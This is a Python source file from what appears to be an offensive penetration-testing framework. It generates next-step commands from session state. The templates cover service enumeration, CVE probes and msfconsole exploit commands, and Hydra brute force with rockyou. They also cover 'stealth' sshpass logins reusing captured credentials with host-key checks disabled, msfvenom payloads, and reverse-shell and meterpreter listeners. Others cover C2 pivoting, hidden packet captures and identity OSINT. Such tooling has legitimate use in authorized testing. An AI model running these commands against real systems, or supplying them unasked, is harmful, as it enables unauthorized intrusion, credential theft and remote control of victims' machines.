"""
suggest.py — state-aware command suggestions for the manual modules.

Centralises the "what should I do next?" logic that used to live only in the
static `build_commands()` menus: suggestions are computed from the live
session (target, open services, fingerprints, prior module results) so the
`preview` flow proposes commands that match the current engagement state.
"""

import re

from phantom.core.session import session

_OPEN_PORT_RE = re.compile(
    r"(\d+)/(tcp|udp)[ \t]+open[ \t]+([\w\-\./]+)[ \t]*(.*)")


def _infer_product(version: str) -> str:
    """Derive the product name from a version string when it is missing.

    "Apache httpd 2.4.49" -> "apache"  (matches the CVE registry software).
    """
    if not version:
        return ""
    v = str(version).lower()
    from phantom.automation.exploit.modules import module_registry
    for name in module_registry.known_software():
        if name in v:
            return name
    return ""

_SERVICE_HINTS = {
    "ssh": ("ssh", [
        "nc -nv {t} {p}",
        "ssh-keyscan -t rsa,ecdsa,ed25519 {t} 2>/dev/null | tee /tmp/.host-keys",
    ]),
    "http": ("web", [
        "whatweb {t}",
        "curl -sI http://{t}:{p}",
        "nikto -h http://{t}:{p} -Delay 2",
    ]),
    "https": ("web", [
        "sslscan {t}:{p}",
        "whatweb {t}",
        "curl -skI https://{t}:{p}",
    ]),
    "smb": ("smb", [
        "enum4linux -a {t}",
        "smbclient -L //{t}",
        "rpcclient -U '' {t}",
    ]),
    "microsoft-ds": ("smb", [
        "enum4linux -a {t}",
        "smbclient -L //{t}",
        "rpcclient -U '' {t}",
    ]),
    "netbios-ssn": ("smb", [
        "enum4linux -a {t}",
        "smbclient -L //{t}",
    ]),
    "ftp": ("ftp", [
        "nmap -sV -p {p} {t}",
        "curl -s ftp://{t} --connect-timeout=5",
    ]),
    "mysql": ("db", [
        "nmap -sV -p {p} {t}",
        "mysql -h {t} -P {p} --connect-timeout=5 -e 'SELECT version();'",
    ]),
    "postgresql": ("db", ["nmap -sV -p {p} {t}"]),
    "mssql": ("db", ["nmap -sV -p {p} {t}"]),
    "redis": ("cache", ["nmap -sV -p {p} {t}"]),
    "snmp": ("snmp", [
        "snmpwalk -c public -v2c {t}",
        "onesixtyone {t} public",
    ]),
    "rdp": ("rdp", ["nmap -sV -p {p} {t}"]),
}


def session_services() -> list:
    """Normalised open-service list gathered from any session result.

    Sources (deduplicated, in priority order): the `service_summary` result,
    the raw `scan` outputs and the ranked services of the `exploit` result.
    """
    services = []
    seen = set()

    summary = session.get_result("service_summary")
    if summary:
        for s in summary:
            if not isinstance(s, dict):
                continue
            port = str(s.get("port") or "")
            service = (s.get("service") or "").lower()
            key = f"{port}/{service}"
            if key in seen:
                continue
            seen.add(key)
            services.append({
                "port": port,
                "proto": str(s.get("proto") or "tcp"),
                "service": service,
                "product": str(s.get("product") or ""),
                "version": str(s.get("version") or "").strip(),
            })

    scan_res = session.get_result("scan") or {}
    if isinstance(scan_res, dict):
        for output in scan_res.values():
            if not isinstance(output, str):
                continue
            for line in output.splitlines():
                m = _OPEN_PORT_RE.match(line)
                if not m:
                    continue
                pnum, proto, svc, ver = m.groups()
                svc = svc.lower()
                key = f"{pnum}/{svc}"
                if key in seen:
                    continue
                seen.add(key)
                services.append({
                    "port": pnum, "proto": proto, "service": svc,
                    "product": "", "version": ver.strip(),
                })

    expl = session.get_result("exploit") or {}
    if isinstance(expl, dict):
        for entry in (expl.get("ranked") or [])[:15]:
            svc = entry.get("service")
            if svc is None:
                continue
            port = str(getattr(svc, "port", "") or "")
            name = str(getattr(svc, "service", "") or "").lower()
            key = f"{port}/{name}"
            if key in seen:
                continue
            seen.add(key)
            services.append({
                "port": port,
                "proto": str(getattr(svc, "protocol", "") or "tcp"),
                "service": name,
                "product": str(getattr(svc, "product", "") or ""),
                "version": str(getattr(svc, "version", "") or "").strip(),
            })

    for s in services:
        s["product"] = s["product"].lower()
        if not s["product"] and s.get("version"):
            s["product"] = _infer_product(s["version"])
    return services


def service_suggestion_group(services=None) -> dict:
    """Targeted enumeration commands for the services already known open."""
    services = session_services() if services is None else services
    t = session.target
    if not t or not services:
        return {}
    groups = {}
    for s in services[:8]:
        name = s.get("service") or "unknown"
        port = s.get("port") or "?"
        cmds = None
        label = f"SUGGESTED (unknown:{port})"
        for token, (kind, base) in _SERVICE_HINTS.items():
            if token in name:
                cmds = [c.format(t=t, p=port) for c in base]
                label = f"SUGGESTED ({kind}:{port})"
                break
        groups.setdefault(label, []).extend(
            cmds or [f"nmap -sV -p {port} {t}"])
    return groups


def _service_search_product(s: dict) -> str:
    """Product name to search for: registry product if known, else the
    leading alphabetic token of the banner version ("nginx 1.18.0" ->
    "nginx"). Used by the dynamic layers so unknown products still get
    correlated instead of being skipped."""
    product = (s.get("product") or "").lower()
    if product:
        return product
    version = (s.get("version") or "").strip()
    if version:
        m = re.match(r"([A-Za-z][A-Za-z0-9\-]*)", version)
        if m:
            return m.group(1).lower()
    return ""


def probe_suggestion_group(services=None) -> dict:
    """Single-shot CVE validation one-liners (EXPLOIT PHASE ONLY).

    Derived from the registry module's `probe` metadata for the services
    actually fingerprinted: one request, no files written, no tools beyond
    curl/openssl. These run BEFORE the msf module fires — they never appear
    in scan-phase suggestions (enumerating a probe before the version is
    known is wasted noise).
    """
    services = session_services() if services is None else services
    t = session.target
    if not t:
        return {}
    from phantom.automation.exploit.modules import module_registry
    groups = {}
    for s in services:
        product = (s.get("product") or "").lower()
        if not product:
            continue
        module = module_registry.match(product, (s.get("version") or "") or None)
        if module is None or not module.probe:
            continue
        port = s.get("port") or ""
        svc = s.get("service") or ""
        scheme = "https" if "https" in svc or port == "443" else "http"
        base = (f"{scheme}://{t}" if not port
                else f"{scheme}://{t}:{port}")
        probe = module.probe
        kind = probe.get("kind")
        if kind == "http":
            path = probe.get("path") or "/"
            marker = probe.get("marker") or ""
            cmd = (f"curl -sk --max-time 10 \"{base}{path}\" "
                   f"| grep -m1 -q \"{marker}\" "
                   f"&& echo VULN-{module.cve_id} || echo SAFE-{module.cve_id}")
        elif kind == "header":
            header = probe.get("header") or "X-Api-Version"
            value = probe.get("value") or ""
            cmd = (f"curl -sk --max-time 10 -o /dev/null -w '%{{http_code}}\\n' "
                   f"-H '{header}: {value}' {base}/")
        elif kind == "tls":
            cmd = (f"openssl s_client -connect {t}:{port or 443} -tlsextdebug 2>&1 "
                   f"| grep -qi 'heartbeat (id=15)' "
                   f"&& echo VULN-{module.cve_id} || echo SAFE-{module.cve_id}")
        else:
            continue
        groups[f"SUGGESTED (probe:{module.cve_id})"] = [cmd]
    return groups


def cve_lookup_suggestion_group(services=None) -> dict:
    """Live NVD correlation for services the static catalog does NOT cover.

    Never invents a command for an unknown product: it surfaces the CVE ids
    the NVD keyword search returned (cached on disk, TTL'd), each with a
    one-line detail link and a searchsploit lookup. When the network is
    down the resolver returns [] and this group is simply empty.
    """
    services = session_services() if services is None else services
    t = session.target
    if not t:
        return {}
    from phantom.automation.exploit.modules import module_registry
    from phantom.automation.exploit.resolver import get_resolver
    groups = {}
    for s in services:
        product = _service_search_product(s)
        if not product:
            continue
        version = s.get("version") or ""
        if module_registry.match(product, version or None) is not None:
            continue  # catalog covers it: probes + msf already suggested
        for hit in get_resolver().lookup(product, version):
            cve = hit.get("cve", "")
            if not cve:
                continue
            groups[f"SUGGESTED (cve-lookup:{cve})"] = [
                f"curl -s 'https://nvd.nist.gov/vuln/detail/{cve}' | grep -o "
                f"'<title>[^<]*</title>'",
                f"searchsploit --cve {cve} --json 2>/dev/null || true",
            ]
    return groups


def creds_suggestion_group() -> dict:
    """Credential-reuse one-liners from the credentials found so far.

    Uses session.knowledge_base["creds_found"] (the same store automode
    and the workflow fill): for each pair it emits the stealth login command
    for the matching service — sshpass without known_hosts writes, and
    service-specific clients for the rest. Never writes files, never
    echoes the password into a local log.
    """
    t = session.target
    if not t:
        return {}
    creds = session.knowledge_base.get("creds_found") or []
    if not creds:
        return {}
    groups = {}
    for c in creds:
        if not isinstance(c, dict):
            continue
        user = c.get("username") or c.get("user") or ""
        pw = c.get("password") or c.get("pass") or ""
        if not user or not pw:
            continue
        svc = str(c.get("service") or c.get("method") or "").lower()
        port = str(c.get("port") or "")
        if "ssh" in svc:
            groups.setdefault("SUGGESTED (creds reuse)", []).append(
                f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "
                f"{user}@{t}")
        elif "mysql" in svc:
            groups.setdefault("SUGGESTED (creds reuse)", []).append(
                f"mysql -h {t} -P {port or 3306} -u {user} -p'{pw}' "
                f"-e 'SELECT version();'")
        elif "smb" in svc or "microsoft-ds" in svc:
            groups.setdefault("SUGGESTED (creds reuse)", []).append(
                f"smbclient -L //{t} -U '{user}%{pw}'")
        elif "ftp" in svc:
            groups.setdefault("SUGGESTED (creds reuse)", []).append(
                f"curl -s --connect-timeout 5 ftp://{user}:{pw}@{t}/")
        else:
            groups.setdefault("SUGGESTED (creds reuse)", []).append(
                f"nc -w 5 {t} {port or 22}  # creds for {svc or 'unknown'}")
    return groups


def vulners_fallback_group() -> dict:
    """Deprecated alias — replaced by the hunter's stealthy scan rows
    (phantom/automation/exploit/hunter.py). Kept so old callers still
    resolve; scan.py uses vuln_hunt_suggestion_group directly."""
    from phantom.automation.exploit.hunter import vuln_hunt_suggestion_group
    return vuln_hunt_suggestion_group()


def exploit_suggestion_group(services=None) -> dict:
    """Version-matched exploit commands from the CVE module registry.

    Reuses the same registry + synthesis the autonomous agent uses, so the
    manual module and the auto-mode agree on the exact msfconsole command.
    """
    services = session_services() if services is None else services
    t = session.target
    if not t:
        return {}
    from phantom.automation.exploit.modules import module_registry
    from phantom.automation.exploit.synthesis import synthesize_command
    groups = {}
    for s in services:
        product = (s.get("product") or "").lower()
        if not product:
            continue
        version = s.get("version") or ""
        module = module_registry.match(product, version or None)
        if module is None:
            continue
        port = s.get("port") or ""
        groups[f"SUGGESTED EXPLOIT ({module.cve_id})"] = [
            synthesize_command(module, t, port),
            f"searchsploit --cve {module.cve_id} --json",
        ]
    groups.update(probe_suggestion_group(services))
    groups.update(cve_lookup_suggestion_group(services))
    from phantom.automation.exploit.hunter import behavioural_hunt_suggestion_group
    groups.update(behavioural_hunt_suggestion_group(services))
    return groups


def first_steps_suggestion_group() -> dict:
    """Boot-strap and follow-up enumeration suggestions for the SCAN phase.

    No CVE probes here on purpose: probes belong to the exploit phase once
    the version is fingerprinted. The scan phase stays pure enumeration —
    when services are already known, the follow-up group deepens the
    fingerprint (OS, UDP top ports, service scripts on the open ports).
    """
    t = session.target
    if not t:
        return {}
    services = session_services()
    if services:
        ports = ",".join(dict.fromkeys(
            str(s.get("port")) for s in services if s.get("port")))
        groups = {
            "SUGGESTED (Follow-up)": [
                f"sudo nmap -O {t}",
                f"sudo nmap -sU --top-ports 20 {t}",
            ],
        }
        if ports:
            groups["SUGGESTED (Follow-up)"].append(
                f"sudo nmap -sV -sC -p {ports} {t}")
        return groups
    from phantom.utils.paths import scan_xml_path
    return {
        "SUGGESTED (First Steps)": [
            f"sudo nmap -sV -sC -p- -oX {scan_xml_path(t)} {t}   # enables exploit module",
            f"sudo nmap -O {t}",
        ],
    }


# ---------------------------------------------------------------------------
# Per-module state-aware suggestions (manual core: scan, osint, web, brute,
# payload, handler, pivot, analyzer, report, wifi, wordlist).
# ---------------------------------------------------------------------------

_AUTH_SERVICES = {"ssh", "ftp", "smb", "rdp", "telnet", "mysql",
                  "mssql", "postgresql", "http", "https"}
_WEB_SERVICES = {"http", "https", "http-alt", "ssl/http", "ssl/https"}


def session_os() -> str:
    """Target OS hint from the knowledge base or the raw scan output."""
    os_info = session.knowledge_base.get("os_info") or {}
    name = str(os_info.get("name") or "")
    if name:
        return name
    scan_res = session.get_result("scan") or {}
    if isinstance(scan_res, dict):
        blob = " ".join(str(v) for v in scan_res.values()).lower()
        for needle, label in (("windows", "Windows"), ("linux", "Linux"),
                              ("android", "Android"), ("darwin", "macOS"),
                              ("macos", "macOS")):
            if needle in blob:
                return label
    return ""


def session_target_type() -> str:
    """Target type from the knowledge base, else classify at runtime."""
    tt = session.knowledge_base.get("target_type") or ""
    if tt:
        return tt
    t = session.target
    if not t:
        return ""
    from phantom.automation.guidance.targets import classify_target
    return classify_target(t)


def osint_suggestion_group() -> dict:
    """Identity/domain/IP-specific OSINT commands, plus next steps driven by
    the intelligence already gathered (subdomains, emails)."""
    t = session.target
    if not t:
        return {}
    tt = session_target_type()
    groups = {}
    if tt in ("email", "username", "phone"):
        handle = t.split("@")[0] if "@" in t else t
        groups["SUGGESTED (Identity)"] = [
            f"sherlock {handle} --timeout 5 --print-found",
            f"theHarvester -d {handle} -l 200 -b all",
        ]
        emails = session.knowledge_base.get("emails_found") or []
        if emails:
            groups["SUGGESTED (Identity)"] += [
                f"breach-check {' '.join(str(e) for e in emails[:5])}",
            ]
    elif tt in ("domain", "url"):
        d = t.split("/")[0] if "://" in t else t
        groups["SUGGESTED (Domain)"] = [
            f"curl -s 'https://crt.sh/?q=%25.{d}&output=json' | jq '.[].name_value' | sort -u",
            f"amass enum -d {d} -passive",
        ]
        subs = session.knowledge_base.get("subdomains_found") or []
        if subs:
            groups["SUGGESTED (Domain)"] += [
                f"httpx -l {' '.join(str(s) for s in subs[:8])} -title -status-code",
            ]
    else:
        groups["SUGGESTED (IP)"] = [
            f"shodan host {t}",
            f"whois {t}",
        ]
    return groups


def web_suggestion_group() -> dict:
    """Web testing commands targeted at the web services already found open."""
    t = session.target
    if not t:
        return {}
    web = [s for s in session_services()
           if s.get("service") in _WEB_SERVICES
           or "http" in s.get("service", "")]
    if not web:
        return {}
    wl = (session.active_wordlist
          or "/usr/share/wordlists/dirb/common.txt")
    groups = {}
    for s in web[:3]:
        port = s.get("port") or ""
        scheme = "https" if "https" in s.get("service", "") else "http"
        base = (f"{scheme}://{t}" if not port
                else f"{scheme}://{t}:{port}")
        groups[f"SUGGESTED (web:{port or scheme})"] = [
            f"whatweb {base}",
            f"nikto -h {base} -Tuning 123b -Delay 2",
            f"ffuf -w {wl} -u {base}/FUZZ -mc 200,301,302 -t 50",
        ]
    return groups


def brute_suggestion_group() -> dict:
    """Hydra one-liners for the authentication services already open."""
    t = session.target
    if not t:
        return {}
    auth = [s for s in session_services()
            if s.get("service") in _AUTH_SERVICES]
    if not auth:
        return {}
    wl = session.active_wordlist or "/usr/share/wordlists/rockyou.txt"
    groups = {}
    for s in auth[:6]:
        svc = s.get("service", "ssh")
        groups[f"SUGGESTED (brute:{svc})"] = [
            f"hydra -t 4 -W 3 -l admin -P {wl} {t} {svc}  AGGRESSIVE",
        ]
    groups.update(creds_suggestion_group())
    return groups


def payload_suggestion_group() -> dict:
    """Platform-aware payload generation for the detected target OS."""
    t = session.target
    if not t:
        return {}
    os_name = session_os().lower()
    if not os_name:
        return {}
    if "win" in os_name:
        plat = "windows"
    elif "android" in os_name:
        plat = "android"
    elif "mac" in os_name or "darwin" in os_name:
        plat = "macos"
    else:
        plat = "linux"
    from phantom.automation.exploit.payloads import PayloadFactory
    pf = PayloadFactory()
    spec = pf.spec(plat, "x64")
    lhost = session.lhost or "127.0.0.1"
    lport = session.lport or 4444
    return {
        "SUGGESTED (payload)": [
            pf.msfvenom_command(spec, lhost, lport, out=spec.staging_path),
            f"generate {plat}",
        ],
    }


def handler_suggestion_group() -> dict:
    """Listener commands matching the detected target platform."""
    t = session.target
    if not t:
        return {}
    os_name = session_os().lower()
    payload = "linux/x64/shell_reverse_tcp"
    if "win" in os_name:
        payload = "windows/x64/shell_reverse_tcp"
    elif "android" in os_name:
        payload = "android/meterpreter/reverse_tcp"
    lport = session.lport or 4444
    return {
        "SUGGESTED (handler)": [
            f"listen --port {lport} --payload {payload}  AGGRESSIVE",
            f"listen --port {lport} --type https  AGGRESSIVE",
        ],
    }


def pivot_suggestion_group() -> dict:
    """Pivot commands once a beacon session is registered on the C2."""
    t = session.target
    if not t:
        return {}
    from phantom.core.c2_server import c2_state
    if not c2_state.beacons:
        return {}
    return {
        "SUGGESTED (pivot)": [
            "socks 1080",
            "portfwd <lport> <rhost> <rport>",
        ],
    }


def analyzer_suggestion_group() -> dict:
    """Traffic analysis commands once scan data exists."""
    t = session.target
    if not t:
        return {}
    if not session.get_result("scan"):
        return {}
    return {
        "SUGGESTED (analyze)": [
            "tcpdump -i eth0 -w /tmp/.capture.pcap",
            "tshark -r /tmp/.capture.pcap -q -z io,phs",
        ],
    }


def report_suggestion_group() -> dict:
    """Export commands once the session holds results."""
    if not session.results:
        return {}
    return {
        "SUGGESTED (report)": [
            "export json report.json",
            "export markdown report.md",
            "export pdf report.pdf",
        ],
    }


def reasoning_suggestion_group() -> dict:
    """Live senior hypotheses from the shared WorldModel — the SAME
    deterministic reasoning engine the autonomous agent runs, applied to
    what the operator has found manually. Every suggestion is an
    actionable capability + the reason it is worth trying next.

    The engine registers hypotheses idempotently on the WorldModel, so
    re-running `suggest` shows the still-pending ones (confirmed/refuted
    hypotheses disappear — their cycle is closed)."""
    from phantom.core.knowledge import session_wm
    from phantom.automation.reasoning import ReasoningEngine
    from phantom.automation.guidance.commands import make_registry
    try:
        wm = session_wm()
        ReasoningEngine(make_registry()).run(wm)
        pending = sorted(wm.pending_hypotheses(),
                         key=lambda h: h.priority, reverse=True)
    except Exception:
        return {}
    if not pending:
        return {}
    return {"SUGGESTED (reasoning)": [
        f"[{h.capability_id}] {h.reason}" for h in pending]}


def wifi_suggestion_group() -> dict:
    """First WiFi steps (interface setup before any attack)."""
    return {
        "SUGGESTED (wifi)": [
            "sudo airmon-ng check kill",
            "sudo airmon-ng start <iface>",
        ],
    }


def wordlist_suggestion_group() -> dict:
    """Wordlist generation seeded with target-derived tokens."""
    t = session.target
    if not t:
        return {}
    name = re.split(r"[^\w]+", t.lower())[0] or "company"
    return {
        "SUGGESTED (wordlist)": [
            f"generate aA1s --min 8 --max 16 --name {name}",
            f"generate a1 --sets lowercase,numbers --name {name}",
        ],
    }
